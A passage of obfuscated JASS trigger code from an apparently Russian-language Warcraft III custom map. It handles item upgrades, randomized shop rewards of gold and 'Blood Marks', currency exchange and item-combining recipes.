if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E30384F then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.13,.13,.13,.13,.13,13,"+350 стат, 13% Экстрактов",350,350,350)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303449,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305858 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303741 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.07,.07,0,0,0,0,"+400 Силы, 7% Силы, защиты",400,0,0)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303850,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305859 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303743 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,0,0,0,.07,.07,0,"+400 разума, 7% Магии, Жизни",0,0,400)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303851,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$4930585A then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303742 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,0,0,.09,0,0,0,"+400 ловкости, 9% разрушения",300,300,300)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303852,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$49305930 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303851 or GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303852 or GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303850 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.09,.09,.09,.09,.09,9,"+450 стат, 9% Экстрактов",450,450,450)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303853,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$72656A32 and GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])!=$6E30364F then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,0,0,0,0,0,0,"+25 стат",25,25,25)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E30364F,GetUnitX(Hu),GetUnitY(Hu),0.)
elseif GetItemTypeId(MO)==$66726867 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E30364F then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,0,0,0,0,0,0,"+60 стат",60,60,60)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303632,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$6776736D then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303632 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.03,.03,.03,.03,.03,3,"+80 стат, 3% к Экстрактам",80,80,80)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303349,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$64757374 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303349 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.06,.06,.06,.06,.06,6,"+130 стат, 6% к Экстрактам",130,130,130)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E30334B,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$73707265 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E30334B then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.1,.1,.1,.1,.1,10,"+160 стат, 10% к Экстрактам",160,160,160)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303348,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$6D6E7366 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303348 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.14,.14,.14,.14,.14,14,"+200 стат, 14% к Экстрактам",200,200,200)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E303752,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
elseif GetItemTypeId(MO)==$61786173 then
if GetUnitTypeId(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)])==$6E303752 then
call RemoveUnit(NL[2*(Ma+1)])
set Nm=true
call ni(Hu,.17,.17,.17,.17,.17,17,"+250 стат, 17% к Экстрактам",250,250,250)
set NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)]=CreateUnit(Player(GetPlayerId(GetOwningPlayer(Hu))),$6E30344A,GetUnitX(Hu),GetUnitY(Hu),0.)
endif
endif
if Nm==true then
set L9=1
loop
call UnitAddItemById(NL[2*(Ma+1)],hM[L9])
set L9=L9+1
exitwhen L9>6
endloop
call UnitAddAbility(NL[2*(GetPlayerId(GetOwningPlayer(Hu))+1)],$41314136)
endif
set MO=null
set Hu=null
endfunction
function Bus takes nothing returns nothing
local trigger hL=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hL,EVENT_PLAYER_UNIT_USE_ITEM)
call TriggerAddAction(hL,function Bur)
set hL=null
endfunction
function But takes nothing returns boolean
if not (IsUnitType(GetBuyingUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Buu takes nothing returns boolean
if not (Tr==100) then
return false
endif
return true
endfunction
function Buv takes nothing returns boolean
if not (Tr==99) then
return false
endif
return true
endfunction
function Buw takes nothing returns boolean
if not (Tr>90) then
return false
endif
if not (Tr<=98) then
return false
endif
return true
endfunction
function Bux takes nothing returns boolean
if not (Tr>80) then
return false
endif
if not (Tr<=90) then
return false
endif
return true
endfunction
function Buy takes nothing returns boolean
if not (Tr>70) then
return false
endif
if not (Tr<=80) then
return false
endif
return true
endfunction
function Buz takes nothing returns boolean
if not (Tr>60) then
return false
endif
if not (Tr<=70) then
return false
endif
return true
endfunction
function Bu0 takes nothing returns boolean
if not (Tr>50) then
return false
endif
if not (Tr<=60) then
return false
endif
return true
endfunction
function Bu1 takes nothing returns boolean
if not (Tr>40) then
return false
endif
if not (Tr<=50) then
return false
endif
return true
endfunction
function Bu2 takes nothing returns boolean
if not (Tr>30) then
return false
endif
if not (Tr<=40) then
return false
endif
return true
endfunction
function Bu3 takes nothing returns boolean
if not (Tr>20) then
return false
endif
if not (Tr<=30) then
return false
endif
return true
endfunction
function Bu4 takes nothing returns boolean
if not (Tr>10) then
return false
endif
if not (Tr<=20) then
return false
endif
return true
endfunction
function Bu5 takes nothing returns boolean
if not (Tr<=10) then
return false
endif
return true
endfunction
function Bu6 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305253) then
return false
endif
return true
endfunction
function Bu7 takes nothing returns boolean
if not (Tr==100) then
return false
endif
return true
endfunction
function Bu8 takes nothing returns boolean
if not (Tr==99) then
return false
endif
return true
endfunction
function Bu9 takes nothing returns boolean
if not (Tr>90) then
return false
endif
if not (Tr<=98) then
return false
endif
return true
endfunction
function BvB takes nothing returns boolean
if not (Tr>80) then
return false
endif
if not (Tr<=90) then
return false
endif
return true
endfunction
function BvC takes nothing returns boolean
if not (Tr>70) then
return false
endif
if not (Tr<=80) then
return false
endif
return true
endfunction
function BvD takes nothing returns boolean
if not (Tr>60) then
return false
endif
if not (Tr<=70) then
return false
endif
return true
endfunction
function BvE takes nothing returns boolean
if not (Tr>50) then
return false
endif
if not (Tr<=60) then
return false
endif
return true
endfunction
function BvF takes nothing returns boolean
if not (Tr>40) then
return false
endif
if not (Tr<=50) then
return false
endif
return true
endfunction
function BvG takes nothing returns boolean
if not (Tr>30) then
return false
endif
if not (Tr<=40) then
return false
endif
return true
endfunction
function BvH takes nothing returns boolean
if not (Tr>20) then
return false
endif
if not (Tr<=30) then
return false
endif
return true
endfunction
function BvI takes nothing returns boolean
if not (Tr>10) then
return false
endif
if not (Tr<=20) then
return false
endif
return true
endfunction
function BvJ takes nothing returns boolean
if not (Tr<=10) then
return false
endif
return true
endfunction
function BvK takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305254) then
return false
endif
return true
endfunction
function BvL takes nothing returns boolean
if not (Tr==100) then
return false
endif
return true
endfunction
function BvM takes nothing returns boolean
if not (Tr==99) then
return false
endif
return true
endfunction
function BvN takes nothing returns boolean
if not (Tr>90) then
return false
endif
if not (Tr<=98) then
return false
endif
return true
endfunction
function BvO takes nothing returns boolean
if not (Tr>80) then
return false
endif
if not (Tr<=90) then
return false
endif
return true
endfunction
function BvP takes nothing returns boolean
if not (Tr>70) then
return false
endif
if not (Tr<=80) then
return false
endif
return true
endfunction
function BvQ takes nothing returns boolean
if not (Tr>60) then
return false
endif
if not (Tr<=70) then
return false
endif
return true
endfunction
function BvR takes nothing returns boolean
if not (Tr>50) then
return false
endif
if not (Tr<=60) then
return false
endif
return true
endfunction
function BvS takes nothing returns boolean
if not (Tr>40) then
return false
endif
if not (Tr<=50) then
return false
endif
return true
endfunction
function BvT takes nothing returns boolean
if not (Tr>30) then
return false
endif
if not (Tr<=40) then
return false
endif
return true
endfunction
function BvU takes nothing returns boolean
if not (Tr>20) then
return false
endif
if not (Tr<=30) then
return false
endif
return true
endfunction
function BvV takes nothing returns boolean
if not (Tr>10) then
return false
endif
if not (Tr<=20) then
return false
endif
return true
endfunction
function BvW takes nothing returns boolean
if not (Tr<=10) then
return false
endif
return true
endfunction
function BvX takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305255) then
return false
endif
return true
endfunction
function BvY takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305754) then
return false
endif
return true
endfunction
function BvZ takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305756) then
return false
endif
return true
endfunction
function Bva takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$4931314B) then
return false
endif
return true
endfunction
function Bvb takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305757) then
return false
endif
return true
endfunction
function Bvc takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$4931314A) then
return false
endif
return true
endfunction
function Bvd takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305755) then
return false
endif
return true
endfunction
function Bve takes nothing returns nothing
if Bu6() then
set Tr=GetRandomInt(1,100)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваше число: "+("|c0000ffff"+I2S(Tr)))
if Bu5() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ff0000ничего")
else
if Bu4() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff0010|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+30
else
if Bu3() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff0015|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+45
else
if Bu2() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff0020|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+60
else
if Bu1() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff0025|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+75
else
if Bu0() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff0035|R золота и 2 |c00ff9696Кровавых Метки")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+105
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+6
else
if Buz() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00100|R золота и 2 |c00ff9696Кровавых Метки")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+300
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+6
else
if Buy() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00200|R золота
")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+600
else
if Bux() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: 3 |c00ff9696Кровавых Метки")
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+9
else
if Buw() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00350|R золота и Элемент Лесной Чащи.")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+1050
call UnitAddItemByIdSwapped($73656872,GetBuyingUnit())
else
if Buv() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: 5 |c00ff9696Кровавых Меток|r и Амулет Леса!")
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+15
call UnitAddItemByIdSwapped($77696C64,GetBuyingUnit())
else
if Buu() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00350|R золота и Кольцо Паука!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+1050
call UnitAddItemByIdSwapped($7370726E,GetBuyingUnit())
else
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
else
endif
if BvK() then
set Tr=GetRandomInt(1,100)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваше число: "+("|c0000ffff"+I2S(Tr)))
if BvJ() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ff0000ничего")
else
if BvI() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff0030|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+90
else
if BvH() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff0050|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+150
else
if BvG() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00100|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+300
else
if BvF() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00150|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+450
else
if BvE() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00200|R золота и 10 |c00ff9696Кровавых Меток")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+600
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+30
else
if BvD() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00300|R золота ")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+900
else
if BvC() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: 20 |c00ff9696Кровавых Меток")
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+60
else
if BvB() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00800|R золота ")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+2400
else
if Bu9() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: 25 |c00ff9696Кровавых Меток|r и Кольцо Паука.")
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+75
call UnitAddItemByIdSwapped($7370726E,GetBuyingUnit())
else
if Bu8() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00800|R золота, и Жезл!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+2400
call UnitAddItemByIdSwapped($776E6575,GetBuyingUnit())
else
if Bu7() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff001000|R золота, 35 |c00ff9696Кровавых Меток|r ")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+3000
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+105
else
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
else
endif
if BvX() then
set Tr=GetRandomInt(1,100)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваше число: "+("|c0000ffff"+I2S(Tr)))
if BvW() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ff0000ничего")
else
if BvV() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00100|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+300
else
if BvU() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00150|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+450
else
if BvT() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00200|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+600
else
if BvS() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00250|R золота!")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+750
else
if BvR() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00500|R золота и 10 |c00ff9696Кровавых Меток")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+1500
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+30
else
if BvQ() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff00800|R золота ")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+2400
else
if BvP() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: 20 |c00ff9696Кровавых Меток")
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+60
else
if BvO() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff001500|R золота ")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+4500
else
if BvN() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: 35 |c00ff9696Кровавых Меток|r и Жезл.")
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+105
call UnitAddItemByIdSwapped($776E6575,GetBuyingUnit())
else
if BvM() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: Бронированый Шлем!")
call UnitAddItemByIdSwapped($72737431,GetBuyingUnit())
else
if BvL() then
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetBuyingUnit())),"Ваша награда: |c00ffff001800|R золота, 35 |c00ff9696Кровавых Меток|r")
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+5400
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+105
else
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
endif
else
endif
if BvY() then
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]-450
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+30
else
endif
if BvZ() then
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]-4500
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+300
else
endif
if Bva() then
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]-45000
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+3000
else
endif
if Bvb() then
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+4500
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]-300
else
endif
if Bvc() then
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+45000
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]-3000
else
endif
if Bvd() then
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]+450
set NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetBuyingUnit()))]-30
else
endif
endfunction
function Bvf takes nothing returns nothing
set hQ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hQ,EVENT_PLAYER_UNIT_SELL_ITEM)
call TriggerAddCondition(hQ,Condition(function But))
call TriggerAddAction(hQ,function Bve)
endfunction
function Bvg takes nothing returns nothing
local item hS=GetSoldItem()
local unit QF=GetBuyingUnit()
if GetItemTypeId(hS)==$49305730 then
if nO(QF,$4930564E) then
call RemoveItem(nP(QF,$4930564E))
set NF=false
call nQ($49304B53,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305650) then
call RemoveItem(nP(QF,$49305650))
set NF=false
call nQ($49304B55,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$49305651) then
call RemoveItem(nP(QF,$49305651))
set NF=false
call nQ($49304B54,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
if nO(QF,$4930564F) then
call RemoveItem(nP(QF,$4930564F))
set NF=false
call nQ($49304B52,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if GetItemTypeId(hS)==$4930564C then
if nO(QF,$49305655) then
if nO(QF,$49303231) then
call RemoveItem(nP(QF,$49305655))
call RemoveItem(nP(QF,$49303231))
set NF=false
call nQ($4930565A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl",QF,"origin"))
endif
endif
if nO(QF,$49305654) then
if nO(QF,$49303231) then
call RemoveItem(nP(QF,$49305654))
call RemoveItem(nP(QF,$49303231))
set NF=false
call nQ($49305658,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Orc\\Disenchant\\DisenchantSpecialArt.mdl",QF,"chest"))
